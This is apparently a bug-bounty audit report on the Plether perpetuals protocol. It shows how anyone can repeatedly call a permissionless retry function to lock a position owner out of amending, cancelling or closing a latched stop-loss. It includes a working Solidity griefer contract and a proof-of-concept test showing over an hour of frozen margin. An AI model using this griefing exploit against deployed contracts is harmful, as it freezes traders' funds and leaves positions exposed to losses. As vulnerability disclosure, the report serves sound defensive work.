# \#98565 [SC-High] Permissionless retryPositionProtectionClose keeps a latched protection re-queued with stale limits, so the owner can never amend them or exit the position

**Submitted on Nov 8th 2026 at 18:10:06 UTC by @kujen for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98565
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour

## Description

## Brief/Intro
A latched protection can only be repaired by its owner through `amendLatchedPositionProtectionCloseLimits`. That call requires status `Latched` and zero pending orders. Anyone can call `retryPositionProtectionClose` at any time while the protection is Latched. A third party (or a keeper following the documented "append a retry" liveness duty) can therefore re-queue the doomed child with the old ceilings before the owner amends, and repeat this once per execution window. While that continues, the owner cannot amend, cannot cancel, and cannot commit any order. The position stays open at whatever the market does, and its margin stays locked.

## Vulnerability Details
The owner's only repair path is `PositionProtectionBook.sol:338-351`. It reverts `OrderRouter__ProtectionNotLatched` unless the status is `Latched`, and `OrderRouter__PendingOrdersExist` unless the account queue is empty. Once a retry has re-queued a child, the status is `Triggered`, so amend reverts on the first check.

The retry path, `PositionProtectionBook.sol:384-407`, has no caller restriction and no cooldown. It needs only Latched status, a matching position and an empty queue. It immediately calls `_recordCloseAttempt`, which moves the protection back to `Triggered` with a fresh child built from the stored (stale) `closeLimits` (`OrderLiquidationBatchLogic.sol:183-206`, `654-675`).

The owner's other exits are all closed for the same period:
- `_cancel` accepts only `PendingOpen` / `Armed` (`PositionProtectionBook.sol:415-421`).
- `cancelPositionProtectionAndCommitClose` accepts only `Armed` (`:362-364`).
- Every public commit reverts `OrderRouter__ProtectionActive` while an active protection exists (`OrderLiquidationBatchLogic.sol:313-315`).

A child built with the stale ceiling fails terminally (`ConstraintViolation`). If no one executes it, it expires after `maxExecutionWindowSeconds` (60 s by default, `OrderExecutionOrchestrator.sol:11`). Either way `handleFailedProtectionAttempt` relatches it (`PositionProtectionBook.sol:640-677`), and the next retry is open again to anyone. An unprivileged contract can expire the child (via `executeOrder` at the head, or via `clearInvalidOrders`, which works "even behind a live head") and call `retryPositionProtectionClose` in the same transaction. The account is then never `Latched` with an empty queue at any block boundary.

How the stale ceiling arises in normal use: a trader sets `maxGrossAccountDebitAssets` to the expected loss at the stop plus a slack. Triggers are disabled while the oracle is frozen (`PositionProtectionBook.sol:528-530`), so a weekend gap, or any 0.3% overshoot between the trigger tick and the execution tick, pushes the realized debit past the ceiling. The code provides `amendLatchedPositionProtectionCloseLimits` as the owner's repair path for exactly this case (it is not described in SECURITY.md, which documents only that retry is permissionless and that triggering is irreversible, `SECURITY.md:547-561`). Because retry is open to anyone and moves the protection back to `Triggered`, a third party can keep that owner-only repair path unreachable.

## Impact Details
In the PoC, a 10,000-unit LONG with 2,000 USDG margin and a stop at 1.005 is triggered at 1.008. The first close fails because its gross account debit is 84.032 USDG against a 60 USDG ceiling (receipt: `ConstraintViolation(3, 84032000, 60000000)`), and the protection latches. I then ran 65 grief cycles. At every block boundary the owner's amend reverted `ProtectionNotLatched`, cancel reverted `ProtectionNotArmed`, and a fresh public close reverted `ProtectionActive`. After 3,965 seconds (over an hour) the full position was still open and one doomed child was still live. The owner's 2,000 USDG position margin stays locked. The position stays exposed to further adverse moves until it is liquidated or the griefer stops. The attacker spends only gas, one cheap Arbitrum transaction per 60 s window. The control test shows the same owner amends and closes immediately when nobody retries first.

The lockout lasts as long as the griefer keeps paying gas; the PoC holds it for 3,965 seconds, beyond the one-hour threshold. An owner using a smart account can escape by expiring the child and amending in one batch; an EOA owner, the common case, has to win a transaction race against the griefer in every window.

The same lockout occurs without a malicious party if a keeper implements the SECURITY.md liveness duty (process the terminal attempt, then append a retry) in one batch.

## References
- `packages/perps/src/PositionProtectionBook.sol:338-351` (amend gate), `:384-407` (permissionless retry), `:409-431` (cancel status gate), `:640-677` (relatch)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:183-206`, `:313-315`, `:654-675`
- `packages/perps/src/router/OrderExecutionOrchestrator.sol:11` (60 s window)
- `packages/perps/SECURITY.md:547-561`, `:1356-1359`



## Proof of Concept

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

interface IRouterExec {
    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory result);
}

// unprivileged contract: expires the live child and appends a fresh one in the same tx
contract RetryGriefer {
    function cycle(
        address router,
        address book,
        uint64 liveChild,
        uint64 protectionId
    ) external returns (uint64 nextChild) {
        IRouterExec(router).executeOrder(liveChild, new bytes[](0));
        nextChild = IPositionProtectionActions(book).retryPositionProtectionClose(protectionId);
    }
}

contract PoC_F4_LatchedRetryGrief is BasePerpTest {

    IPositionProtectionBook internal protectionBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;
    RetryGriefer internal griefer;

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;
    uint256 internal constant LONG_STOP_LOSS = 100_500_000;
    uint256 internal constant GAP_PRICE = 100_800_000;
    uint256 internal constant DEBIT_CEILING = 60e6;

    function setUp() public override {
        super.setUp();
        protectionBook = router.positionProtectionBook();
        protectionActions = IPositionProtectionActions(address(protectionBook));
        protectionViews = IPositionProtectionViews(address(protectionBook));
        griefer = new RetryGriefer();
        _fundTrader(ALICE, 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    function test_retryGrief_ownerCannotAmendStaleLatchedLimits() public {
        (uint64 protectionId, uint64 child) = _latchedAfterGap();
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

        // third party re-queues the child with the stale ceiling before the owner can amend
        child = protectionActions.retryPositionProtectionClose(protectionId);
        uint256 startedAt = vm.getBlockTimestamp();

        PositionProtectionTypes.CloseFinancialLimits memory fixedLimits = _limits(type(uint256).max);
        uint256 cycles;
        for (uint256 i; i < 65; ++i) {
            // owner tries every exit she has at this block boundary
            OrderV3Types.OrderRequest memory exitReq = _closeRequest(bytes32(uint256(0xC105E000 + i)));
            vm.startPrank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, fixedLimits);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtection(protectionId);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
            router.commitOrder(exitReq);
            vm.stopPrank();

            uint64 deadline = router.lifecycleBook().orderTiming(child).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            child = griefer.cycle(address(router), address(protectionBook), child, protectionId);
            ++cycles;
        }

        (uint256 sizeAfter,,,,,,) = engine.positions(ALICE);
        uint256 frozenFor = vm.getBlockTimestamp() - startedAt;
        emit log_named_uint("grief cycles", cycles);
        emit log_named_uint("seconds owner was locked out", frozenFor);
        emit log_named_uint("position size still open", sizeAfter);
        assertEq(sizeAfter, POSITION_SIZE, "position never closed");
        assertGe(frozenFor, 1 hours, "owner locked out for at least an hour");
        assertEq(uint8(_status(protectionId)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
        assertEq(router.pendingOrderCounts(ALICE), 1, "a doomed child is always live");
    }

    function test_control_ownerAmendsWhenNobodyRetriesFirst() public {
        (uint64 protectionId,) = _latchedAfterGap();
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _limits(type(uint256).max));
        uint64 child = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(child, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry closes");
        (uint256 sizeAfter,,,,,,) = engine.positions(ALICE);
        assertEq(sizeAfter, 0, "position closed after amendment");
    }

    function _latchedAfterGap() internal returns (uint64 protectionId, uint64 child) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        // 50 USDG loss at the stop plus 10 USDG slack for fees
        params.closeLimits = _limits(type(uint256).max);
        params.closeLimits.maxGrossAccountDebitAssets = DEBIT_CEILING;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);

        // basket gaps 0.3% through the stop before the next tick
        _mockPythUpdateData(GAP_PRICE);
        bytes[] memory live = _livePriceData(GAP_PRICE);
        vm.prank(TRIGGER_KEEPER);
        child = protectionActions.triggerPositionProtection(protectionId, live);

        bytes[] memory data = _mockPythUpdateData(GAP_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(child, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "gap breaches the debit ceiling");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
    }

    function _status(
        uint64 protectionId
    ) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    function _limits(
        uint256 v
    ) internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l = PositionProtectionTypes.CloseFinancialLimits(v, v, v, v);
    }

    function _closeRequest(
        bytes32 clientId
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = clientId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
```

## PoC Output
```text
Ran 2 tests for test/perps/poc/PoC_F4_LatchedRetryGrief.t.sol:PoC_F4_LatchedRetryGrief
[PASS] test_control_ownerAmendsWhenNobodyRetriesFirst() (gas: 6215263)
[PASS] test_retryGrief_ownerCannotAmendStaleLatchedLimits() (gas: 91876663)
Logs:
  grief cycles: 65
  seconds owner was locked out: 3965
  position size still open: 10000000000000000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 281.92ms (266.97ms CPU time)

Ran 1 test suite in 283.49ms (281.92ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
